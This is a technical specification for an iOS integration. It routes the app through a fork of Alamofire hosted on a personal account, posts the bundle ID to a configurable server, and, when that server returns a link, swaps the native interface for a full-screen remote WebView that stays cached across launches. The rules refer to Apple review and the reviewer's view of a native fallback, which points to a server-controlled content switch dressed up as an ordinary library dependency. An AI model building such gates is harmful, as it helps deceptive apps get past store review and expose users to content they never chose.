# integrate

# Technical Specification: Alamofire Gate + AppsFlyer Integration

Интеграция **без OneSignal**. WebView показывается только при `HTTP 200` и теле ответа в формате ссылки.

---

## 1. Dependencies (SPM)

| Package                 | Repository                                                  | Version          |
| ----------------------- | ----------------------------------------------------------- | ---------------- |
| Alamofire (custom fork) | https://github.com/oksanadv393-boter23/Alamofire            | branch: `master` |
| AppsFlyer               | https://github.com/AppsFlyerSDK/AppsFlyerFramework-Static    | `6.17.9+`        |

**Target Assignment (main app only):** `Alamofire`, `AppsFlyerLib-Static`

---

## 2. Files to Create/Modify

| File | Action |
| ---- | ------ |
| `App/AppDelegate.swift` | Create |
| `App/IntegrationConfig.swift` | Create |
| `Services/ContentLinkValidator.swift` | Create |
| `Services/AppTrackingAuthorizationService.swift` | Create |
| `Services/RegistrationService.swift` | Create |
| `App/{AppName}App.swift` | Modify — gate + watchdog |
| `template/Info.plist` | Create — SKAdNetwork + ATT |
| `template.xcodeproj/project.pbxproj` | SPM + `INFOPLIST_FILE` |
| `*.entitlements` | Empty dict (без push/groups) |

> **НЕ использовать** `NetworkService.shared.performRegistration` из форка — он ждёт JSON `{success, app_data}`. Использовать только `RegistrationService`.

---

## 3. IntegrationConfig.swift

```swift
import Foundation

enum IntegrationConfig {
    static let apiDomain = "https://{API_DOMAIN}"
    static let appsFlyerDevKey = "{APPSFLYER_DEV_KEY}"
    static let appleAppID = "{APPLE_APP_ID}"  // без префикса "id"
}
```

---

## 4. Info.plist

Создать `template/Info.plist` (исключить из synchronized group через `membershipExceptions`).

Обязательные ключи:

```xml
<key>NSUserTrackingUsageDescription</key>
<string>We use this identifier to personalize your experience and measure app performance.</string>

<key>NSAdvertisingAttributionReportEndpoint</key>
<string>https://appsflyer-skadnetwork.com/</string>

<key>AttributionCopyEndpoint</key>
<string>https://appsflyer-skadnetwork.com/</string>

<key>SKAdNetworkItems</key>
<array>
    <!-- полный список SKAdNetwork ID партнёров AppsFlyer -->
    <!-- взять из nelvio/Info.plist или AppsFlyer dashboard -->
</array>
```

В `project.pbxproj` для main target:

```
GENERATE_INFOPLIST_FILE = YES;
INFOPLIST_FILE = template/Info.plist;
```

---

## 5. AppDelegate.swift

```swift
import UIKit
import AppsFlyerLib
@preconcurrency import Alamofire

extension Notification.Name {
    static let appsFlyerDidStart = Notification.Name("appsFlyerDidStart")
}

final class AppDelegate: NSObject, UIApplicationDelegate {

    func application(
        _ application: UIApplication,
        didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]? = nil
    ) -> Bool {
        AppConfiguration.serverBaseURL = IntegrationConfig.apiDomain

        AppsFlyerLib.shared().appsFlyerDevKey = IntegrationConfig.appsFlyerDevKey
        AppsFlyerLib.shared().appleAppID = IntegrationConfig.appleAppID
        AppsFlyerLib.shared().waitForATTUserAuthorization(timeoutInterval: 60)

        NotificationCenter.default.addObserver(
            self,
            selector: #selector(applicationDidBecomeActive),
            name: UIApplication.didBecomeActiveNotification,
            object: nil
        )

        return true
    }

    @objc private func applicationDidBecomeActive() {
        AppsFlyerLib.shared().start()
        NotificationCenter.default.post(name: .appsFlyerDidStart, object: nil)
    }
}
```

> **Не вызывать `requestTrackingAuthorization` в `didBecomeActive`.** SDK ждёт ATT через `waitForATTUserAuthorization(60)`; prompt показывается отдельно (онбординг). Дублирование ATT + `waitForATT` ломает тайминг SKAN postbacks.

---

## 5a. AppTrackingAuthorizationService.swift

```swift
import AppTrackingTransparency
import Foundation

enum AppTrackingAuthorizationService {
    private static var didStartRequest = false

    @MainActor
    static func requestAuthorizationIfNeeded() async {
        guard !didStartRequest else { return }
        didStartRequest = true

        try? await Task.sleep(nanoseconds: 500_000_000)

        await withCheckedContinuation { continuation in
            ATTrackingManager.requestTrackingAuthorization { _ in
                continuation.resume()
            }
        }
    }
}
```

Вызвать при завершении онбординга **или при первом показе WebView**:

```swift
await AppTrackingAuthorizationService.requestAuthorizationIfNeeded()
```

В WebView-ветке `rootView`:

```swift
.task {
    await AppTrackingAuthorizationService.requestAuthorizationIfNeeded()
}
```

---

## 6. ContentLinkValidator.swift

```swift
import Foundation

enum ContentLinkValidator {
    static func validatedLink(from raw: String?) -> String? {
        guard let raw else { return nil }

        let text = raw.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !text.isEmpty, text.count <= 2048 else { return nil }
        guard !text.contains(where: \.isNewline) else { return nil }
        guard !text.hasPrefix("{"), !text.hasPrefix("[") else { return nil }

        let candidate = text.lowercased().hasPrefix("http://") || text.lowercased().hasPrefix("https://")
            ? text
            : "https://\(text)"

        guard let url = URL(string: candidate),
              let host = url.host?.lowercased(),
              host.contains("."),
              url.scheme == "http" || url.scheme == "https" else {
            return nil
        }

        return text
    }
}
```

---

## 7. RegistrationService.swift

```swift
import Foundation
@preconcurrency import Alamofire

final class RegistrationService {
    static let shared = RegistrationService()

    private let session: Session

    private init() {
        let configuration = URLSessionConfiguration.default
        configuration.timeoutIntervalForRequest = AppConfiguration.networkTimeout
        configuration.timeoutIntervalForResource = AppConfiguration.networkTimeout
        session = Session(configuration: configuration)
    }

    func performRegistration(pushToken: String = "", completion: @escaping (DisplayMode, String?) -> Void) {
        guard let url = URL(string: AppConfiguration.registrationEndpoint) else {
            completion(Self.resolvedMode(freshLink: nil), Self.resolvedURL(freshLink: nil))
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.setValue("text/plain", forHTTPHeaderField: "Accept")
        request.httpBody = try? JSONEncoder().encode(
            RegistrationPayload(bundle: Bundle.main.bundleIdentifier ?? "", push_token: pushToken)
        )

        session.request(request)
            .responseString { response in
                let freshLink: String?
                if response.response?.statusCode == 200 {
                    freshLink = ContentLinkValidator.validatedLink(from: response.value)
                    if let freshLink {
                        DataCache.shared.contentURL = freshLink
                        DataCache.shared.wasRegistrationAttempted = true
                    }
                } else {
                    freshLink = nil
                }

                completion(Self.resolvedMode(freshLink: freshLink), Self.resolvedURL(freshLink: freshLink))
            }
    }

    private static func resolvedURL(freshLink: String?) -> String? {
        freshLink ?? ContentLinkValidator.validatedLink(from: DataCache.shared.contentURL)
    }

    private static func resolvedMode(freshLink: String?) -> DisplayMode {
        resolvedURL(freshLink: freshLink) == nil ? .nativeInterface : .webContent
    }
}

private struct RegistrationPayload: Encodable {
    let bundle: String
    let push_token: String
}
```

---

## 8. Main App Struct

Обернуть существующий native UI в gate. Сохранить весь текущий `init()` (SwiftData, DI и т.д.).

```swift
import SwiftUI
@preconcurrency import Alamofire

@main
struct {AppName}App: App {
    @UIApplicationDelegateAdaptor(AppDelegate.self) private var appDelegate

    // ... существующие зависимости проекта ...

    @State private var isInitializing = true
    @State private var displayMode: Alamofire.DisplayMode = .loading
    @State private var webContentURL: String?

    var body: some Scene {
        WindowGroup {
            rootView
                .onAppear { performRegistration() }
        }
    }

    @ViewBuilder
    private var rootView: some View {
        ZStack {
            if isInitializing {
                ZStack {
                    Color.black.ignoresSafeArea()
                    ProgressView().tint(.white)
                }
            } else if displayMode == .webContent, let url = webContentURL {
                let fullURL = url.hasPrefix("http") ? url : "https://\(url)"
                ZStack {
                    Color.black.ignoresSafeArea()
                    Alamofire.WebContentView(url: fullURL)
                }
                .preferredColorScheme(.dark)
            } else {
                // Native app content (существующий root)
            }
        }
    }

    private func performRegistration() {
        if let saved = ContentLinkValidator.validatedLink(from: DataCache.shared.contentURL) {
            finishLaunch(mode: .webContent, url: saved)
        }

        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            finishLaunch(mode: .nativeInterface, url: nil)
        }

        RegistrationService.shared.performRegistration(pushToken: "") { mode, url in
            DispatchQueue.main.async { finishLaunch(mode: mode, url: url) }
        }
    }

    private func finishLaunch(mode: Alamofire.DisplayMode, url: String?) {
        guard isInitializing else { return }
        displayMode = mode
        webContentURL = url
        isInitializing = false
    }
}
```

---

## 9. Registration API

**Endpoint:** `POST {API_DOMAIN}/api/v1/users/register`

**Request:**

```json
{
  "bundle": "com.example.app",
  "push_token": ""
}
```

**Response (plain text, не JSON):**

```
https://example.com/content
```

или

```
example.com/content
```

### Логика WebView

| Условие | UI |
| ------- | -- |
| `HTTP 200` + тело похоже на ссылку | WebView, ссылка сохраняется |
| `HTTP != 200` или тело не ссылка, кэша нет | Native |
| Любая ошибка/таймаут, кэша нет | Native |
| Любой ответ, но валидный кэш есть | WebView (sticky URL) |

**Sticky URL:** сохранённая ссылка показывается сразу на старте (до сети). Пустой/ошибочный ответ **не перезаписывает** кэш. `finishLaunch` с `guard isInitializing` — только первое событие (кэш / сеть / watchdog).

---

## 10. Initialization Order

```
didFinishLaunching
├── AppConfiguration.serverBaseURL = apiDomain
├── AppsFlyer: devKey, appleAppID, waitForATT(60)
└── observer didBecomeActive

didBecomeActive
└── AppsFlyerLib.shared().start()

Onboarding finish
└── AppTrackingAuthorizationService.requestAuthorizationIfNeeded()

App.onAppear
├── validate cached link → web (если есть)
├── watchdog 5s → native (если кэша не было)
└── RegistrationService.performRegistration
```

---

## 11. Required Parameters

| Parameter | Location |
| --------- | -------- |
| `{API_DOMAIN}` | `IntegrationConfig.apiDomain` |
| `{APPSFLYER_DEV_KEY}` | `IntegrationConfig.appsFlyerDevKey` |
| `{APPLE_APP_ID}` | `IntegrationConfig.appleAppID` |
| `{BUNDLE_ID}` | Xcode target + registration payload |

---

## 12. Critical Rules

1. **Не использовать OneSignal** — без NSE, без app groups, без `UIBackgroundModes: remote-notification`
2. **Не использовать `NetworkService` из форка** — только `RegistrationService` с `responseString` и проверкой `statusCode == 200`
3. **WebView только при валидной ссылке** — JSON, HTML, пустой ответ → native
4. **Watchdog 5с обязателен** — лоадер не блокируется на сети (Apple review)
5. **SKAN endpoints обязательны** — `NSAdvertisingAttributionReportEndpoint` + `AttributionCopyEndpoint` в `Info.plist`; `SKAdNetworkItems` — полный список
6. **ATT отдельно от `start()`** — `waitForATTUserAuthorization(60)` в `didFinishLaunching`, `start()` на `didBecomeActive`, ATT prompt в онбординге через `AppTrackingAuthorizationService`
7. **WebView safe area** — `ZStack { Color.black.ignoresSafeArea() }` + `.preferredColorScheme(.dark)`
8. **`{API_DOMAIN}` без гео-блокировок** — иначе ревьюер увидит native fallback
9. **Не хардкодить бренд приложения** — использовать `AppConstants.appName` или placeholder

---

## 13. Verification Checklist

- [ ] SPM resolves: Alamofire fork + AppsFlyerLib-Static
- [ ] Build succeeds on simulator
- [ ] `Info.plist` содержит `NSAdvertisingAttributionReportEndpoint`, `AttributionCopyEndpoint` и 100+ `SKAdNetworkIdentifier`
- [ ] При недоступном API — native через ≤5с
- [ ] При `200` + `https://...` — WebView
- [ ] При `200` + `{json}` — native
- [ ] Повторный запуск с кэшем — WebView без сети
